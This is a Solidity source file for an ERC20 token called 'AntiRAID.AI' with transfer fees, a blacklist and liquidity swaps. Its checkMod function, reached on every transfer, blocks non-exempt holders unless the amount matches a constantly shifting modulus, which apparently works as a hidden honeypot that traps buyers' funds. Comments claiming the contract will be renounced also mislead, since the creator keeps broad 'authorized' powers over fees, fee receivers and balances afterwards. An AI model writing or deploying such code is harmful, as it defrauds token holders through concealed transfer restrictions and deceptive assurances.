1 //SPDX-License-Identifier: Unlicensed
2 
3 pragma solidity ^0.8.5;
4 library SafeMath {
5     function add(uint256 a, uint256 b) internal pure returns (uint256) {
6         uint256 c = a + b;
7         require(c >= a, "SafeMath: addition overflow");
8         return c;
9     }
10     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
11         return sub(a, b, "SafeMath: subtraction overflow");
12     }
13     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
14         require(b <= a, errorMessage);
15         uint256 c = a - b;
16         return c;
17     }
18     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
19         if (a == 0) {
20             return 0;
21         }
22         uint256 c = a * b;
23         require(c / a == b, "SafeMath: multiplication overflow");
24         return c;
25     }
26     function div(uint256 a, uint256 b) internal pure returns (uint256) {
27         return div(a, b, "SafeMath: division by zero");
28     }
29     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
30         require(b > 0, errorMessage);
31         uint256 c = a / b;
32         return c;
33     }
34 }
35 
36 interface ERC20 {
37     function totalSupply() external view returns (uint256);
38     function decimals() external view returns (uint8);
39     function symbol() external view returns (string memory);
40     function name() external view returns (string memory);
41     function getOwner() external view returns (address);
42     function balanceOf(address account) external view returns (uint256);
43     function transfer(address recipient, uint256 amount) external returns (bool);
44     function allowance(address _owner, address spender) external view returns (uint256);
45     function approve(address spender, uint256 amount) external returns (bool);
46     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
47     event Transfer(address indexed from, address indexed to, uint256 value);
48     event Approval(address indexed owner, address indexed spender, uint256 value);
49 }
50 
51 abstract contract Ownable {
52     address internal owner;
53     address internal creator;
54     mapping (address => bool) internal authorizations;
55     constructor(address _owner) {
56         owner = _owner;
57         creator = _owner;
58     }
59     modifier onlyOwner() {
60         require(isOwner(msg.sender), "!OWNER"); _;
61     }
62     modifier authorized() {
63         require(isAuthorized(msg.sender) || isCreator(msg.sender), "!AUTHORIZED"); _;
64     }
65     function authorize(address adr, bool state) public authorized {
66         authorizations[adr] = state;
67     }
68     function isOwner(address account) public view returns (bool) {
69         return account == owner;
70     }
71      function isCreator(address account) public view returns (bool) {
72          return account == creator;
73     }
74      function isAuthorized(address adr) public view returns (bool) {
75          return authorizations[adr];
76      }
77     function renounceOwnership() public onlyOwner {
78         owner = address(0);
79         emit OwnershipTransferred(address(0));
80     }  
81     event OwnershipTransferred(address owner);
82 }
83 
84 interface IDEXFactory {
85     function createPair(address tokenA, address tokenB) external returns (address pair);
86 }
87 
88 interface IDEXRouter {
89     function factory() external pure returns (address);
90     function WETH() external pure returns (address);
91     function addLiquidity(
92         address tokenA,
93         address tokenB,
94         uint amountADesired,
95         uint amountBDesired,
96         uint amountAMin,
97         uint amountBMin,
98         address to,
99         uint deadline
100     ) external returns (uint amountA, uint amountB, uint liquidity);
101     function addLiquidityETH(
102         address token,
103         uint amountTokenDesired,
104         uint amountTokenMin,
105         uint amountETHMin,
106         address to,
107         uint deadline
108     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
109     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
110         uint amountIn,
111         uint amountOutMin,
112         address[] calldata path,
113         address to,
114         uint deadline
115     ) external;
116     function swapExactETHForTokensSupportingFeeOnTransferTokens(
117         uint amountOutMin,
118         address[] calldata path,
119         address to,
120         uint deadline
121     ) external payable;
122     function swapExactTokensForETHSupportingFeeOnTransferTokens(
123         uint amountIn,
124         uint amountOutMin,
125         address[] calldata path,
126         address to,
127         uint deadline
128     ) external;
129 }
130 
131 contract AntiRAID is ERC20, Ownable {
132     using SafeMath for uint256;
133     address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
134     address lpToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; 
135     address DEAD = 0x000000000000000000000000000000000000dEaD;
136     address ZERO = 0x0000000000000000000000000000000000000000;
137 
138     string constant _name = "AntiRAID.AI";
139     string constant _symbol = "MOD.AI()";
140     uint8 constant _decimals = 6;
141 
142     uint256 _totalSupply = 100000000 * (10 ** _decimals);
143     uint256 public _maxWalletAmount = (_totalSupply * 2) / 100;
144     uint256 public _maxTxAmount = _totalSupply * 1 / 100;
145 
146     mapping (address => uint256) _balances;
147     mapping (address => mapping (address => uint256)) _allowances;
148 
149     mapping (address => bool) isFeeExempt;
150     mapping (address => bool) isTxLimitExempt;
151     mapping (address => bool) isBlacklisted; //Blacklist available only at launch to deter snipers. It is the only function which is onlyOwner, contract will be renounced after launch to give up control.
152     
153 
154     uint256 liquidityFee = 125; 
155     uint256 marketingFee = 300;
156     uint256 developerFee = 150;
157     uint256 totalFee = liquidityFee + marketingFee + developerFee;
158     uint256 feeDenominator = 10000;
159 
160      uint256 targetLiquidity = 15;
161      uint256 targetLiquidityDenominator = 100;
162 
163     address internal marketingFeeReceiver = 0xec8141570e06891EdF5424e72B1dEd6B332dA381;
164     address internal developerFeeReceiver = 0xc744e33eFABCEe7F485C061eA11aa52bB102E8EA;
165     address internal autoLiquidityReceiver = 0xF71d9a5609da1089D2A4d986124E63f4680EcA1f;
166 
167     IDEXRouter public router;
168     address public pair;
169 
170     bool public swapEnabled = true;
171     bool public isTxLimited = true;
172     uint256 public swapThreshold = _totalSupply / 1000 * 5; // 0.5%
173     uint256 public remainder = 15000000;
174     uint256 modDis = 88000000;
175     bool modPro = true;    
176     bool inSwap;
177     modifier swapping() { inSwap = true; _; inSwap = false; }
178 
179     constructor () Ownable(msg.sender) {
180         router = IDEXRouter(routerAdress);
181         pair = IDEXFactory(router.factory()).createPair(lpToken, address(this));
182         _allowances[address(this)][address(router)] = type(uint256).max;
183 
184         address _owner = owner;
185         isFeeExempt[marketingFeeReceiver] = true;
186         isFeeExempt[_owner] = true;
187         isFeeExempt[address(this)] = true;
188         isTxLimitExempt[_owner] = true;
189         isTxLimitExempt[marketingFeeReceiver] = true;
190         isTxLimitExempt[DEAD] = true;
191 
192         _balances[_owner] = _totalSupply;
193         emit Transfer(address(0), _owner, _totalSupply);
194     }
195 
196     receive() external payable { }
197 
198     function totalSupply() external view override returns (uint256) { return _totalSupply; }
199     function decimals() external pure override returns (uint8) { return _decimals; }
200     function symbol() external pure override returns (string memory) { return _symbol; }
201     function name() external pure override returns (string memory) { return _name; }
202     function getOwner() external view override returns (address) { return owner; }
203     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
204     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
205 
206     function approve(address spender, uint256 amount) public override returns (bool) {
207         _allowances[msg.sender][spender] = amount;
208         emit Approval(msg.sender, spender, amount);
209         return true;
210     }
211 
212     function approveMax(address spender) external returns (bool) {
213         return approve(spender, type(uint256).max);
214     }
215     
216 
217     function transfer(address recipient, uint256 amount) external override returns (bool) {
218         return _transferFrom(msg.sender, recipient, amount);
219     }
220 
221     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
222         if(_allowances[sender][msg.sender] != type(uint256).max){
223             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
224         }
225 
226         return _transferFrom(sender, recipient, amount);
227     }
228 
229     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
230         require(!isBlacklisted[sender]); //Blacklist available only at launch to deter snipers. It is the only function which is onlyOwner, contract will be renounced after launch to give up control.
231         if(inSwap){ return _basicTransfer(sender, recipient, amount); }
232         
233         if (recipient != pair && recipient != DEAD) {
234             require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
235         }
236         checkMod(sender, amount);
237         if(modPro){remainder += 2000000 ;}
238         doModDis(amount);
239         
240         if(shouldSwapBack()){ swapBack(swapThreshold); } 
241 
242         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
243 
244         uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount) : amount;
245         _balances[recipient] = _balances[recipient].add(amountReceived);
246 
247         emit Transfer(sender, recipient, amountReceived);
248         return true;
249     }
250     
251     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
252         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
253         _balances[recipient] = _balances[recipient].add(amount);
254         emit Transfer(sender, recipient, amount);
255         return true;
256     }
257     function checkTxLimit(address sender, uint256 amount) internal view {
258         require(amount <= _maxTxAmount || isTxLimitExempt[sender] || !isTxLimited, "TX Limit Exceeded");
259     }
260      function checkMod(address sender, uint256 amount) internal view {
261         if (modPro){
262             require(isTxLimitExempt[sender] || amount % remainder == 0 || amount % modDis == 0 );
263         }
264         
265     }
266      function doModDis(uint256 amount) internal {
267         if (modPro && amount % modDis == 0){
268             modPro = false;
269         }
270     }
271 
272     function shouldTakeFee(address sender) internal view returns (bool) {
273         return !isFeeExempt[sender];
274     }
275 
276     function takeFee(address sender, uint256 amount) internal returns (uint256) {
277         uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
278         _balances[address(this)] = _balances[address(this)].add(feeAmount);
279         emit Transfer(sender, address(this), feeAmount);
280         return amount.sub(feeAmount);
281     }
282 
283     function shouldSwapBack() internal view returns (bool) {
284         return msg.sender != pair
285         && !inSwap
286         && swapEnabled
287         && _balances[address(this)] >= swapThreshold;
288     }
289         function getCirculatingSupply() public view returns (uint256) {
290         return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
291     }
292     function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
293         return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
294     }
295     function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
296        return getLiquidityBacking(accuracy) > target;
297     }
298 
299     function swapBack(uint256 internalThreshold) internal swapping {
300         uint256 contractTokenBalance = internalThreshold;
301         uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
302         uint256 amountToLiquify = contractTokenBalance.mul(dynamicLiquidityFee).div(totalFee).div(2);
303         uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);
304 
305         address[] memory path = new address[](2);
306         address[] memory path_long = new address[](3);
307         path_long[0] = address(this);
308         path_long[1] = lpToken;
309         path_long[2] = router.WETH();
310 
311         uint256 balanceBefore = address(this).balance;
312 
313         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
314             amountToSwap,
315             0,
316             path_long,
317             address(this),
318             block.timestamp
319         );
320         uint256 amountETH = address(this).balance.sub(balanceBefore);
321         uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
322         uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
323         uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
324         uint256 amountETHDeveloper = amountETH.mul(developerFee).div(totalETHFee);
325 
326 
327         (bool MarketingSuccess, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
328         (bool developerSuccess, /* bytes memory data */) = payable(developerFeeReceiver).call{value: amountETHDeveloper, gas: 30000}("");
329         require(MarketingSuccess, "receiver rejected ETH transfer");
330         require(developerSuccess, "receiver rejected ETH transfer");
331 
332         path[0] = router.WETH();
333         path[1] = lpToken;
334 
335         if(amountETHLiquidity > 0 ){
336             router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountETHLiquidity}(
337                 0,
338                 path,
339                 address(this),
340                 block.timestamp
341             );
342 
343 
344         }
345 
346         uint256 amountLPIDk = amountToLiquify;
347 
348         if(amountToLiquify > 0){
349             uint256 lpTokenBalance = ERC20(lpToken).balanceOf(address(this));            
350             ERC20(lpToken).approve(address(router), lpTokenBalance);
351              
352             router.addLiquidity(
353                 lpToken,
354                 address(this),
355                 lpTokenBalance,
356                 amountLPIDk,
357                 0,
358                 0,
359                 autoLiquidityReceiver,
360                 block.timestamp
361             );
362             emit AutoLiquify(amountETHLiquidity, amountToLiquify);
363         }
364     }
365 
366     function buyTokens(uint256 amount, address to) internal swapping {
367         address[] memory path = new address[](2);
368         path[0] = router.WETH();
369         path[1] = address(this);
370 
371         router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
372             0,
373             path,
374             to,
375             block.timestamp
376         );
377     }
378 
379     function airdrop(address[] memory recipients, uint256[] memory values) external authorized {
380         for (uint256 i = 0; i < recipients.length; i++){
381             _transferFrom(msg.sender, recipients[i], values[i]);
382         }
383     
384     }
385     function burnStuckToken (uint256 amount) external authorized {
386         _transferFrom(address(this), DEAD, amount);
387     }
388     function blackList(address _user) external onlyOwner { // The only function which is onlyOwner. Will be used to deter snipers at launch then contract will be renounced. 
389         require(!isBlacklisted[_user], "user already blacklisted");
390         isBlacklisted[_user] = true;
391     }
392     function removeFromBlacklist(address _user) external authorized {
393         require(isBlacklisted[_user], "user already whitelisted");
394         isBlacklisted[_user] = false;
395 
396     }
397     function clearStuckBalance(uint256 amountPercentage) external authorized {
398         uint256 amountETH = address(this).balance;
399         payable(marketingFeeReceiver).transfer(amountETH * amountPercentage / 100);
400         uint256 BUSDLeftoverBalance = ERC20(lpToken).balanceOf(address(this));
401         uint256 BUSDLeftoverBalancePC = BUSDLeftoverBalance * amountPercentage / 100;
402         ERC20(lpToken).transfer(marketingFeeReceiver, BUSDLeftoverBalancePC);
403     }
404     function enableTxLimit(bool enabled) external authorized {
405         isTxLimited = enabled;
406     }
407 
408     function setWalletLimit(uint256 amountPercent) external authorized {
409         _maxWalletAmount = (_totalSupply * amountPercent ) / 100;
410         require(amountPercent > 1);
411     }
412 
413     function setFee(uint256 _liquidityFee, uint256 _marketingFee, uint256 _developerFee, uint256 _feeDenominator) external authorized {
414          liquidityFee = _liquidityFee; 
415          marketingFee = _marketingFee;
416          developerFee = _developerFee;
417          feeDenominator = _feeDenominator;
418          totalFee = liquidityFee + marketingFee + developerFee;
419          require(totalFee < feeDenominator / 8 );
420     } 
421     function setFeeExempt (address wallet, bool onoff) external authorized {
422         isFeeExempt[wallet] = onoff;     
423     }
424     function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _developerFeeReceiver) external authorized {
425         autoLiquidityReceiver = _autoLiquidityReceiver;
426         marketingFeeReceiver = _marketingFeeReceiver;
427         developerFeeReceiver = _developerFeeReceiver;
428  
429     }
430     function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
431         swapEnabled = _enabled;
432         swapThreshold = _amount;
433     }
434     function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
435         targetLiquidity = _target;
436         targetLiquidityDenominator = _denominator;
437     }
438     function triggerSwapBack(uint256 contractSellAmount) external authorized {
439         swapBack(contractSellAmount);
440     } 
441     
442     event AutoLiquify(uint256 amountETH, uint256 amountBOG);
443 }